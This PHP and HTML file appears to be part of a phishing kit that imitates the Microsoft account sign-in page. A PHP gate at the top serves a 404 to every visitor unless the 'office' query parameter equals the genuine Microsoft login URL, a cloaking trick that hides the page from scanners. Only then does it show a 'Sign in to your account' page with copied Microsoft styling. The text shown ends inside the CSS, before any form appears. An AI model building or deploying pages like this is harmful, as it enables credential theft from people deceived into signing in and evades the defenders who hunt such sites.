<?php
$fuck1 = ('office');
$fuck2 = ('https://login.microsoftonline.com/common/login');


session_start();
if (($_SESSION['redirected'] ?? null) !== true) {
    if ($_GET[$fuck1] === ($fuck2)) {
        $_SESSION['redirected'] = true;
        header('Refresh: 0');
        exit();
    }
    else {
        header('HTTP/1.0 404 Not Found', true, 404);
        exit();
    }
} 
session_destroy();
?>


<html dir="ltr" class="" lang="en">

<head>
	<title>Sign in to your account</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
	<meta name="robots" content="none">
	<style>html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}footer,main,section{display:block}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}b{font-weight:700}img{border:0}svg:not(:root){overflow:hidden}button,input{color:inherit;font:inherit;margin:0}button{overflow:visible}button{text-transform:none}button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input{line-height:normal}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}input[type=search]{-webkit-appearance:textfield;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box}input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}:after,:before{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}button,input{font-family:inherit;font-size:inherit;line-height:inherit}a:focus{outline:thin dotted;outline-offset:-2px;outline:5px auto -webkit-focus-ring-color}img{vertical-align:middle}html{font-size:100%}body{font-family:"Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande",Roboto,Ebrima,"Nirmala UI",Gadugi,"Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI",Tunga,"Lao UI",Raavi,"Iskoola Pota",Latha,Leelawadee,"Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";font-size:15px;line-height:20px;font-weight:400;font-size:.9375rem;line-height:1.25rem;padding-bottom:.23px;padding-top:.23px;color:#000;background-color:#fff}a{color:#ccc;text-decoration:none}a:link{color:#0067b8}a:visited{color:#0067b8}a:hover{color:#666}a:focus{color:#0067b8}a:active{color:#999}@font-face{font-family:'Segoe UI Webfont';src:local("Segoe UI Light");font-weight:200;font-style:normal}@font-face{font-family:'Segoe UI Webfont';src:local("Segoe UI");font-weight:400;font-style:normal}@font-face{font-family:'Segoe UI Webfont';src:local("Segoe UI Semibold");font-weight:600;font-style:normal}.text-body,.text-title{margin-bottom:20px;margin-top:20px;margin-bottom:1.25rem;margin-top:1.25rem}.text-title{font-size:24px;line-height:28px;font-weight:300;font-size:1.5rem;line-height:1.75rem;padding-bottom:2.36px;padding-top:2.36px}.text-body{font-size:15px;line-height:20px;font-weight:400;font-size:.9375rem;line-height:1.25rem;padding-bottom:.23px;padding-top:.23px}[class*=text-maxlines]{overflow:hidden}.text-left{text-align:left}.text-right{text-align:right}.container{margin-right:auto;margin-left:auto;padding-left:2px;padding-right:2px;width:90%}.container:after,.container:before{content:" ";display:table}.container:after{clear:both}.container .container{width:auto}.row{margin-left:-2px;margin-right:-2px}.row:after,.row:before{content:" ";display:table}.row:after{clear:both}.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-13,.col-md-14,.col-md-15,.col-md-16,.col-md-17,.col-md-18,.col-md-19,.col-md-2,.col-md-20,.col-md-21,.col-md-22,.col-md-23,.col-md-24,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-13,.col-xs-14,.col-xs-15,.col-xs-16,.col-xs-17,.col-xs-18,.col-xs-19,.col-xs-2,.col-xs-20,.col-xs-21,.col-xs-22,.col-xs-23,.col-xs-24,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9{position:relative;min-height:1px;padding-left:2px;padding-right:2px}.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-13,.col-xs-14,.col-xs-15,.col-xs-16,.col-xs-17,.col-xs-18,.col-xs-19,.col-xs-2,.col-xs-20,.col-xs-21,.col-xs-22,.col-xs-23,.col-xs-24,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9{float:left}.col-xs-1{width:4.16667%}.col-xs-2{width:8.33333%}.col-xs-3{width:12.5%}.col-xs-4{width:16.66667%}.col-xs-5{width:20.83333%}.col-xs-6{width:25%}.col-xs-7{width:29.16667%}.col-xs-8{width:33.33333%}.col-xs-9{width:37.5%}.col-xs-10{width:41.66667%}.col-xs-11{width:45.83333%}.col-xs-12{width:50%}.col-xs-13{width:54.16667%}.col-xs-14{width:58.33333%}.col-xs-15{width:62.5%}.col-xs-16{width:66.66667%}.col-xs-17{width:70.83333%}.col-xs-18{width:75%}.col-xs-19{width:79.16667%}.col-xs-20{width:83.33333%}.col-xs-21{width:87.5%}.col-xs-22{width:91.66667%}.col-xs-23{width:95.83333%}.col-xs-24{width:100%}@media (min-width:768px){.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-13,.col-md-14,.col-md-15,.col-md-16,.col-md-17,.col-md-18,.col-md-19,.col-md-2,.col-md-20,.col-md-21,.col-md-22,.col-md-23,.col-md-24,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9{float:left}.col-md-1{width:4.16667%}.col-md-2{width:8.33333%}.col-md-3{width:12.5%}.col-md-4{width:16.66667%}.col-md-5{width:20.83333%}.col-md-6{width:25%}.col-md-7{width:29.16667%}.col-md-8{width:33.33333%}.col-md-9{width:37.5%}.col-md-10{width:41.66667%}.col-md-11{width:45.83333%}.col-md-12{width:50%}.col-md-13{width:54.16667%}.col-md-14{width:58.33333%}.col-md-15{width:62.5%}.col-md-16{width:66.66667%}.col-md-17{width:70.83333%}.col-md-18{width:75%}.col-md-19{width:79.16667%}.col-md-20{width:83.33333%}.col-md-21{width:87.5%}.col-md-22{width:91.66667%}.col-md-23{width:95.83333%}.col-md-24{width:100%}}input[type=search]{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}input[type=file]{display:block}input[type=range]{display:block;width:100%}input[type=checkbox]:focus,input[type=file]:focus,input[type=radio]:focus{outline:thin dotted;outline-offset:-2px;outline:5px auto -webkit-focus-ring-color}.form-control{display:block;width:100%;background-image:none}input[type=search]{-webkit-appearance:none}input[type=date],input[type=datetime-local],input[type=month],input[type=time]{line-height:34px}@media (min-width:540px){.form-inline .form-group{display:inline-block;margin-bottom:0;vertical-align:middle}.form-inline .form-control{display:inline-block;width:auto;vertical-align:middle}.form-inline .input-group{display:inline-table;vertical-align:middle}.form-inline .input-group .form-control{width:auto}.form-inline .input-group>.form-control{width:100%}}button,input{max-width:100%;line-height:inherit}.text-input,input[type=color],input[type=date],input[type=datetime-local],input[type=datetime],input[type=email],input[type=month],input[type=number],input[type=password],input[type=search],input[type=tel],input[type=text],input[type=time],input[type=url],input[type=week]{padding:4px 8px;border-style:solid;border-width:2px;border-color:rgba(0,0,0,.4);background-color:rgba(255,255,255,.4);height:32px;height:2rem}input[type=color]:focus,input[type=date]:focus,input[type=datetime-local]:focus,input[type=datetime]:focus,input[type=email]:focus,input[type=month]:focus,input[type=number]:focus,input[type=password]:focus,input[type=search]:focus,input[type=tel]:focus,input[type=text]:focus,input[type=time]:focus,input[type=url]:focus,input[type=week]:focus{border-color:#0067b8;background-color:#fff}input[type=color]::-moz-placeholder,input[type=date]::-moz-placeholder,input[type=datetime-local]::-moz-placeholder,input[type=datetime]::-moz-placeholder,input[type=email]::-moz-placeholder,input[type=month]::-moz-placeholder,input[type=number]::-moz-placeholder,input[type=password]::-moz-placeholder,input[type=search]::-moz-placeholder,input[type=tel]::-moz-placeholder,input[type=text]::-moz-placeholder,input[type=time]::-moz-placeholder,input[type=url]::-moz-placeholder,input[type=week]::-moz-placeholder{color:rgba(0,0,0,.6);opacity:1}input[type=color]:-ms-input-placeholder,input[type=date]:-ms-input-placeholder,input[type=datetime-local]:-ms-input-placeholder,input[type=datetime]:-ms-input-placeholder,input[type=email]:-ms-input-placeholder,input[type=month]:-ms-input-placeholder,input[type=number]:-ms-input-placeholder,input[type=password]:-ms-input-placeholder,input[type=search]:-ms-input-placeholder,input[type=tel]:-ms-input-placeholder,input[type=text]:-ms-input-placeholder,input[type=time]:-ms-input-placeholder,input[type=url]:-ms-input-placeholder,input[type=week]:-ms-input-placeholder{color:rgba(0,0,0,.6)}input[type=color]::-webkit-input-placeholder,input[type=date]::-webkit-input-placeholder,input[type=datetime-local]::-webkit-input-placeholder,input[type=datetime]::-webkit-input-placeholder,input[type=email]::-webkit-input-placeholder,input[type=month]::-webkit-input-placeholder,input[type=number]::-webkit-input-placeholder,input[type=password]::-webkit-input-placeholder,input[type=search]::-webkit-input-placeholder,input[type=tel]::-webkit-input-placeholder,input[type=text]::-webkit-input-placeholder,input[type=time]::-webkit-input-placeholder,input[type=url]::-webkit-input-placeholder,input[type=week]::-webkit-input-placeholder{color:rgba(0,0,0,.6)}input[type=color][disabled],input[type=color][readonly],input[type=date][disabled],input[type=date][readonly],input[type=datetime-local][disabled],input[type=datetime-local][readonly],input[type=datetime][disabled],input[type=datetime][readonly],input[type=email][disabled],input[type=email][readonly],input[type=month][disabled],input[type=month][readonly],input[type=number][disabled],input[type=number][readonly],input[type=password][disabled],input[type=password][readonly],input[type=search][disabled],input[type=search][readonly],input[type=tel][disabled],input[type=tel][readonly],input[type=text][disabled],input[type=text][readonly],input[type=time][disabled],input[type=time][readonly],input[type=url][disabled],input[type=url][readonly],input[type=week][disabled],input[type=week][readonly]{border-color:#ccc!important;background-color:rgba(0,0,0,.2)!important;color:rgba(0,0,0,.2)!important}.form-group.has-error input[type=color],.form-group.has-error input[type=date],.form-group.has-error input[type=datetime-local],.form-group.has-error input[type=datetime],.form-group.has-error input[type=email],.form-group.has-error input[type=month],.form-group.has-error input[type=number],.form-group.has-error input[type=password],.form-group.has-error input[type=search],.form-group.has-error input[type=tel],.form-group.has-error input[type=text],.form-group.has-error input[type=time],.form-group.has-error input[type=url],.form-group.has-error input[type=week],.text-input-has-error,input[type=color].has-error,input[type=date].has-error,input[type=datetime-local].has-error,input[type=datetime].has-error,input[type=email].has-error,input[type=month].has-error,input[type=number].has-error,input[type=password].has-error,input[type=search].has-error,input[type=tel].has-error,input[type=text].has-error,input[type=time].has-error,input[type=url].has-error,input[type=week].has-error{border-color:#e81123}input::-ms-clear,input::-ms-reveal{height:100%;padding:4px 8px;margin-right:-8px;margin-left:4px}input::-ms-clear:hover,input::-ms-reveal:hover{color:#0067b8}input::-ms-clear:active,input::-ms-reveal:active{color:#fff;background-color:#0067b8}.form-group.has-error input::-ms-clear:hover,.form-group.has-error input::-ms-reveal:hover,input.has-error::-ms-clear:hover,input.has-error::-ms-reveal:hover{color:#e81123}.form-group.has-error input::-ms-clear:active,.form-group.has-error input::-ms-reveal:active,input.has-error::-ms-clear:active,input.has-error::-ms-reveal:active{color:#fff;background-color:#e81123}input[type=radio]{width:20px;height:20px}input[type=radio]::-ms-check{background-color:#fff;color:#000;border-style:solid;border-width:2px;border-color:rgba(0,0,0,.6)}input[type=radio]:checked::-ms-check{color:#000;border-color:#0067b8}input[type=radio]:hover::-ms-check{border-color:#000}input[type=radio]:hover:checked::-ms-check{border-color:#0067b8}input[type=radio]:active::-ms-check{color:rgba(0,0,0,.6);border-color:rgba(0,0,0,.6)}input[type=radio]:active:checked::-ms-check{border-color:rgba(0,0,0,.6)}input[type=radio][disabled]::-ms-check{background-color:#fff!important;color:rgba(0,0,0,.2)!important;border-color:rgba(0,0,0,.2)!important}input[type=radio][disabled]:checked::-ms-check{color:rgba(0,0,0,.2)!important}input[type=checkbox]{width:20px;height:20px}input[type=checkbox]::-ms-check{border-style:solid;border-width:2px;background-color:transparent;color:#000;border-color:rgba(0,0,0,.8)}input[type=checkbox]:checked::-ms-check{background-color:#0067b8;border-color:#0067b8}input[type=checkbox]:hover::-ms-check{border-color:#000}input[type=checkbox]:active::-ms-check{background-color:rgba(0,0,0,.6);border-color:transparent}input[type=checkbox][disabled]::-ms-check{border-color:rgba(0,0,0,.2)!important;background-color:transparent!important;color:rgba(0,0,0,.2)!important}input[type=range]{height:42px;padding-bottom:16px;padding-top:16px;border-style:none}input[type=range]::-ms-track{height:2px;border-style:none;background-color:transparent;color:transparent}input[type=range]::-ms-fill-lower{background-color:#0067b8}input[type=range]::-ms-fill-upper{background-color:rgba(0,0,0,.4)}input[type=range]::-ms-thumb{background-color:#0067b8;width:24px;height:8px;border-radius:4px;border-style:none}input[type=range]:hover::-ms-thumb{background-color:#1f1f1f}input[type=range]:active::-ms-thumb{background-color:#ccc}input[type=range]:disabled::-ms-fill-lower,input[type=range]:disabled::-ms-fill-upper{background-color:rgba(0,0,0,.2)!important}input[type=range]:disabled::-ms-thumb{background-color:#ccc!important}.form-group{margin-bottom:12px}input[type=checkbox][disabled],input[type=radio][disabled]{cursor:not-allowed}::-ms-expand{margin:0 6px 0 20px;background-color:transparent;border:0}button,input[type=button],input[type=reset],input[type=submit]{display:inline-block;min-width:100px;padding:4px 12px 4px 12px;margin-top:4px;margin-bottom:4px;position:relative;max-width:100%;text-align:center;white-space:nowrap;overflow:hidden;vertical-align:middle;text-overflow:ellipsis;touch-action:manipulation;color:#000;border-style:solid;border-width:2px;border-color:transparent;background-color:rgba(0,0,0,.2)}button:focus,button:hover,input[type=button]:focus,input[type=button]:hover,input[type=reset]:focus,input[type=reset]:hover,input[type=submit]:focus,input[type=submit]:hover{border-color:rgba(0,0,0,.4)}button:hover,input[type=button]:hover,input[type=reset]:hover,input[type=submit]:hover{cursor:pointer}button:active,input[type=button]:active,input[type=reset]:active,input[type=submit]:active{background-color:rgba(0,0,0,.4);border-color:transparent}button[disabled],input[type=button][disabled],input[type=reset][disabled],input[type=submit][disabled]{cursor:not-allowed;pointer-events:none;outline:0;color:rgba(0,0,0,.2)!important;border-color:transparent!important;background-color:rgba(0,0,0,.2)!important}.section{margin-top:30px;margin-bottom:30px}@media (min-width:320px){.section{margin-top:42px;margin-bottom:42px}}.section .section-title{display:block;margin-top:0;margin-bottom:0;font-size:15px;line-height:20px;font-weight:600;font-size:.9375rem;line-height:1.25rem;padding-bottom:.23px;padding-top:.23px;color:#000}@media (min-width:320px){.section .section-title{font-size:24px;line-height:28px;font-weight:300;font-size:1.5rem;line-height:1.75rem;padding-bottom:2.36px;padding-top:2.36px}}.section.item-section{margin-bottom:32px}.section.item-section .section-title{color:#000;font-size:15px;line-height:20px;font-weight:600;font-size:.9375rem;line-height:1.25rem;padding-bottom:.23px;padding-top:.23px}.input-group{position:relative;display:table;border-collapse:separate}.input-group[class*=col-]{float:none;padding-left:0;padding-right:0}.input-group .form-control{position:relative;z-index:2;float:left;width:100%;margin-bottom:0}.input-group .form-control{display:table-cell}.input-group .form-control:not(:first-child):not(:last-child){border-radius:0}.input-group .form-control:first-child{border-bottom-right-radius:0;border-top-right-radius:0}.input-group .form-control:last-child{border-bottom-left-radius:0;border-top-left-radius:0}.alert{margin-bottom:8px;margin-top:8px}.alert-error{color:#e81123}@font-face{font-family:"Segoe UI Webfont";font-weight:300;src:local("Segoe UI Semilight")}@font-face{font-family:"Segoe UI Webfont";font-weight:700;src:local("Segoe UI Bold")}@font-face{font-family:"Segoe UI Webfont";font-style:italic;font-weight:400;src:local("Segoe UI Italic")}@font-face{font-family:"Segoe UI Webfont";font-style:italic;font-weight:700;src:local("Segoe UI Bold Italic")}a:focus{outline-offset:0}input[type=checkbox]:focus,input[type=file]:focus,input[type=radio]:focus{outline-offset:0}.container{width:100%}.section{margin-top:0}body{direction:ltr}body #c_content{margin:0 auto}.wrap-content{word-wrap:break-word}.text-secondary{color:rgba(0,0,0,.7);font-size:13px}body.cb{text-align:center}body.cb .text-13{font-size:.8125rem}body.cb .alert-error{text-align:left}body.cb div.placeholderContainer{width:100%;position:relative}body.cb div.placeholder{color:#666;background-color:transparent;margin-top:6px;margin-left:9px;white-space:nowrap;text-align:left;cursor:text}.no-padding-left-right{padding-left:0;padding-right:0}.display-block{display:block}.display-inline-block{display:inline-block;white-space:nowrap}@keyframes pulse{from{opacity:.4}}@-o-keyframes pulse{from{opacity:.4}}@-moz-keyframes pulse{from{opacity:.4}}@-webkit-keyframes pulse{from{opacity:.4}}@-webkit-keyframes progressDot{0%,20%{left:0;-webkit-animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;-webkit-animation-timing-function:linear}65%{left:60%;-webkit-animation-timing-function:ease-in}75%{opacity:1}100%,80%{left:100%;opacity:0}}@-moz-keyframes progressDot{0%,20%{left:0;-moz-animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;-moz-animation-timing-function:linear}65%{left:60%;-moz-animation-timing-function:ease-in}75%{opacity:1}100%,80%{left:100%;opacity:0}}@-o-keyframes progressDot{0%,20%{left:0;-o-animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;-o-animation-timing-function:linear}65%{left:60%;-o-animation-timing-function:ease-in}75%{opacity:1}100%,80%{left:100%;opacity:0}}@keyframes progressDot{0%,20%{left:0;animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;animation-timing-function:linear}65%{left:60%;animation-timing-function:ease-in}75%{opacity:1}100%,80%{left:100%;opacity:0}}@keyframes fadeIn{from{opacity:0}to{opacity:1}}@-o-keyframes fadeIn{from{opacity:0}to{opacity:1}}@-moz-keyframes fadeIn{from{opacity:0}to{opacity:1}}@-webkit-keyframes fadeIn{from{opacity:0}to{opacity:1}}body.cb{color:#1b1b1b;text-align:left}.background-image{-webkit-animation:fadeIn 1s;-moz-animation:fadeIn 1s;-o-animation:fadeIn 1s;animation:fadeIn 1s}.background-logo{max-width:256px;max-height:36px;display:block;margin-left:auto;margin-right:auto;-webkit-animation:fadeIn 1s;-moz-animation:fadeIn 1s;-o-animation:fadeIn 1s;animation:fadeIn 1s}.background-logo-holder{height:36px;margin-bottom:24px}.background,.background-image-holder{background:#f2f2f2}.background,.background-image,.background-image-holder,.background>div{position:fixed;top:0;width:100%;height:100%}.background-image,.background>div{background-repeat:no-repeat,no-repeat;background-position:center center,center center;background-size:cover,cover}.footer{position:absolute;left:0;bottom:0;width:100%;overflow:visible;z-index:99;clear:both;min-height:28px}.footer.has-background{background-color:rgba(0,0,0,.6)}div.footerNode{margin:0;float:right}.footer-content.footer-item{color:#000;font-size:12px;line-height:28px;white-space:nowrap;display:inline-block;margin-left:8px;margin-right:8px}.footer-content.footer-item.debug-item{text-decoration:none;letter-spacing:3px;line-height:22px;vertical-align:top;font-size:16px;font-weight:600}.footer-content.footer-item.debug-item.has-background,.footer-content.footer-item.has-background{color:#fff}.outer{display:table;position:absolute;height:100%;width:100%}.top{display:table-cell;vertical-align:top}.middle{display:table-cell;vertical-align:middle}.sign-in-box{margin-left:auto;margin-right:auto;position:relative;max-width:440px;width:calc(100% - 40px);padding:44px;margin-bottom:28px;background-color:#fff;-webkit-box-shadow:0 2px 6px rgba(0,0,0,.2);-moz-box-shadow:0 2px 6px rgba(0,0,0,.2);box-shadow:0 2px 6px rgba(0,0,0,.2);min-width:320px;min-height:338px;overflow:hidden}a:hover{text-decoration:underline}.template-section{display:table-row}.template-section.main-section{height:100%}.template-main-container{display:table-cell}.text-input,input[type=color],input[type=date],input[type=datetime-local],input[type=datetime],input[type=email],input[type=month],input[type=number],input[type=password],input[type=search],input[type=tel],input[type=text],input[type=time],input[type=url],input[type=week]{padding:6px 10px;border-width:1px;border-color:#666;border-color:rgba(0,0,0,.6);height:36px;outline:0;border-radius:0;-webkit-border-radius:0;background-color:transparent}input[type=color]:hover,input[type=date]:hover,input[type=datetime-local]:hover,input[type=datetime]:hover,input[type=email]:hover,input[type=month]:hover,input[type=number]:hover,input[type=password]:hover,input[type=search]:hover,input[type=tel]:hover,input[type=text]:hover,input[type=time]:hover,input[type=url]:hover,input[type=week]:hover{border-color:#323232;border-color:rgba(0,0,0,.8)}input[type=color]:focus,input[type=date]:focus,input[type=datetime-local]:focus,input[type=datetime]:focus,input[type=email]:focus,input[type=month]:focus,input[type=number]:focus,input[type=password]:focus,input[type=search]:focus,input[type=tel]:focus,input[type=text]:focus,input[type=time]:focus,input[type=url]:focus,input[type=week]:focus{border-color:#0067b8;background-color:transparent}input[type=color].has-error:focus,input[type=date].has-error:focus,input[type=datetime-local].has-error:focus,input[type=datetime].has-error:focus,input[type=email].has-error:focus,input[type=month].has-error:focus,input[type=number].has-error:focus,input[type=password].has-error:focus,input[type=search].has-error:focus,input[type=tel].has-error:focus,input[type=text].has-error:focus,input[type=time].has-error:focus,input[type=url].has-error:focus,input[type=week].has-error:focus{border-color:#e81123}body.cb div.placeholder{margin-top:8px;margin-left:0}button,input[type=button],input[type=reset],input[type=submit]{min-height:32px;border:none;background-color:#ccc;background-color:rgba(0,0,0,.2);min-width:108px;line-height:normal}button:hover,input[type=button]:hover,input[type=reset]:hover,input[type=submit]:hover{background-color:#b2b2b2;background-color:rgba(0,0,0,.3)}button:focus,input[type=button]:focus,input[type=reset]:focus,input[type=submit]:focus{background-color:#b2b2b2;background-color:rgba(0,0,0,.3);text-decoration:underline;outline:2px solid #000}button:active,input[type=button]:active,input[type=reset]:active,input[type=submit]:active{outline:0;text-decoration:none;-ms-transform:scale(.98);-webkit-transform:scale(.98);transform:scale(.98)}.button.secondary{display:inline-block;min-width:100px;padding:4px 12px 4px 12px;margin-top:4px;margin-bottom:4px;position:relative;max-width:100%;text-align:center;white-space:nowrap;overflow:hidden;vertical-align:middle;text-overflow:ellipsis;touch-action:manipulation;color:#000;border-style:solid;border-width:2px;border-color:transparent;min-height:32px;border:none;background-color:#ccc;background-color:rgba(0,0,0,.2);min-width:108px;line-height:normal;margin-top:0;margin-bottom:0;display:block;width:100%}.button.secondary:hover{background-color:#b2b2b2;background-color:rgba(0,0,0,.3)}.button.secondary:focus{background-color:#b2b2b2;background-color:rgba(0,0,0,.3);text-decoration:underline;outline:2px solid #000}.button.secondary:active{outline:0;text-decoration:none;-ms-transform:scale(.98);-webkit-transform:scale(.98);transform:scale(.98)}.button.primary{color:#fff;border-color:#0067b8;background-color:#0067b8;display:block;width:100%}.button.primary:hover{background-color:#005da6}.button.primary:focus{background-color:#005da6;text-decoration:underline;outline:2px solid #000}.button.primary:active{outline:0;text-decoration:none;-ms-transform:scale(.98);-webkit-transform:scale(.98);transform:scale(.98)}.logo{max-width:256px;height:24px}.identityBanner{height:24px;background:#fff;margin-top:16px;margin-bottom:-4px}.identity{line-height:24px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.backButton{min-height:24px;width:24px;min-width:24px;float:left;padding:0;background-color:#fff;border-width:0;border-radius:12px;margin-right:2px}.backButton:hover{background-color:#e6e6e6;background-color:rgba(0,0,0,.1)}.backButton:hover:focus{background-color:#ccc;background-color:rgba(0,0,0,.2)}.backButton:active{background-color:#b3b3b3;background-color:rgba(0,0,0,.3)}.backButton:focus{background-color:#e6e6e6;background-color:rgba(0,0,0,.1)}.boilerplate-text{background-color:#f2f2f2;padding:24px 44px 36px 44px;margin:76px -44px -44px -44px}.row{margin-left:0;margin-right:0}.text-body{padding:0;margin-top:16px;margin-bottom:12px}.form-group{margin-bottom:16px}button,input[type=button],input[type=reset],input[type=submit]{margin-top:0;margin-bottom:0}.col-xs-12.secondary{padding-right:4px}.col-xs-12.primary{padding-left:4px}.no-padding-top-bottom{padding-top:0;padding-bottom:0}.banner-logo{max-height:36px}.no-wrap{white-space:nowrap}.position-buttons>div:first-child{display:inline-block;width:100%;margin-bottom:36px}.button-container{position:absolute;bottom:0;right:0;text-align:right}@media (max-width:600px),(max-height:366px){.background,.background-image,.background-image-holder,.background>div{display:none}.background-logo-holder{margin-top:24px}.middle{vertical-align:top}.sign-in-box{padding:24px;margin-top:0;margin-bottom:88px;width:100%;width:100vw;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;border:0}.footer,.footer.has-background{background-color:#fff;filter:none}div.footerNode{float:left;margin:0 24px!important}.footer-content.footer-item,.footer-content.footer-item.debug-item.has-background,.footer-content.footer-item.has-background{color:#747474}.boilerplate-text{padding:20px;margin-top:56px;margin-right:0;margin-bottom:0;margin-left:0}}.inline-block{display:inline-block}.text-input,input[type=color],input[type=date],input[type=datetime-local],input[type=datetime],input[type=email],input[type=month],input[type=number],input[type=password],input[type=search],input[type=tel],input[type=text],input[type=time],input[type=url],input[type=week]{border-top-width:0;border-left-width:0;border-right-width:0;padding-bottom:13}.input.text-box{padding:4px 8px;border-style:solid;border-width:2px;border-color:rgba(0,0,0,.4);background-color:rgba(255,255,255,.4);height:32px;height:2rem;padding:6px 10px;border-width:1px;border-color:#666;border-color:rgba(0,0,0,.6);height:36px;outline:0;border-radius:0;-webkit-border-radius:0;background-color:transparent;border-top-width:0;border-left-width:0;border-right-width:0;padding-left:0}.input.text-box:focus{background-color:#fff;border-color:#0067b8;background-color:transparent}.input.text-box:hover{border-color:#323232;border-color:rgba(0,0,0,.8)}.input.text-box::-moz-placeholder{color:rgba(0,0,0,.6);opacity:1}.input.text-box:-ms-input-placeholder{color:rgba(0,0,0,.6)}.input.text-box::-webkit-input-placeholder{color:rgba(0,0,0,.6)}.input.text-box.has-error{border-color:#e81123}.input.text-box.has-error:focus{border-color:#e81123}[disabled].input.text-box,[readonly].input.text-box{border-color:#ccc!important;background-color:rgba(0,0,0,.2)!important;color:rgba(0,0,0,.2)!important}.text-title{color:#1b1b1b;font-size:1.5rem;font-weight:600;padding:0;margin-top:16px;margin-bottom:12px;font-family:"Segoe UI","Helvetica Neue","Lucida Grande",Roboto,Ebrima,"Nirmala UI",Gadugi,"Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI",Tunga,"Lao UI",Raavi,"Iskoola Pota",Latha,Leelawadee,"Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"}.text-title:lang(zh-cn),.text-title:lang(zh-tw){font-family:"Segoe UI","Helvetica Neue","Lucida Grande",Roboto,Ebrima,"Nirmala UI",Gadugi,"Segoe Xbox Symbol","Segoe UI Symbol","Khmer UI",Tunga,"Lao UI",Raavi,"Iskoola Pota",Latha,Leelawadee,"Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"}.title{margin-bottom:20px;margin-top:20px;margin-bottom:1.25rem;margin-top:1.25rem;font-size:24px;line-height:28px;font-weight:300;line-height:1.75rem;padding-bottom:2.36px;padding-top:2.36px;color:#1b1b1b;font-size:1.5rem;font-weight:600;padding:0;margin-top:16px;margin-bottom:12px;font-family:"Segoe UI","Helvetica Neue","Lucida Grande",Roboto,Ebrima,"Nirmala UI",Gadugi,"Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI",Tunga,"Lao UI",Raavi,"Iskoola Pota",Latha,Leelawadee,"Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"}.secondary-text{font-size:.85rem}.alert{margin-bottom:0;margin-top:0}.error{color:#e81123}.section{margin-bottom:0}div[role=radiogroup]>div[class=radio]:first-child{margin-top:0}.form-group-top{margin-top:16px}div[role=listitem]{margin-left:20px;display:list-item;list-style:circle;list-style-type:disc}.pagination-view{position:relative;min-height:206px}.pagination-view.has-identity-banner{min-height:170px}.lightbox-cover{background-color:#fff;opacity:0;z-index:-1;height:100%;width:100%;position:absolute;top:0;left:0;transition:all .5s ease-in;-o-transition:all .5s ease-in;-moz-transition:all .5s ease-in;-webkit-transition:all .5s ease-in}@media (-ms-high-contrast){.button,button,input[type=button],input[type=reset],input[type=submit]{-ms-high-contrast-adjust:none;outline:1px solid windowText;border:1px solid window;background-color:window;color:windowText;text-decoration:none}.button:hover,button:hover,input[type=button]:hover,input[type=reset]:hover,input[type=submit]:hover{outline:1px solid windowText;border:1px solid highlight;background-color:highlight;color:highlightText;text-decoration:none}.button:hover:focus,button:hover:focus,input[type=button]:hover:focus,input[type=reset]:hover:focus,input[type=submit]:hover:focus{outline:1px solid windowText;border:1px solid windowText;background-color:highlight;color:highlightText;text-decoration:underline}.button:focus,button:focus,input[type=button]:focus,input[type=reset]:focus,input[type=submit]:focus{outline:1px solid windowText;border:1px solid 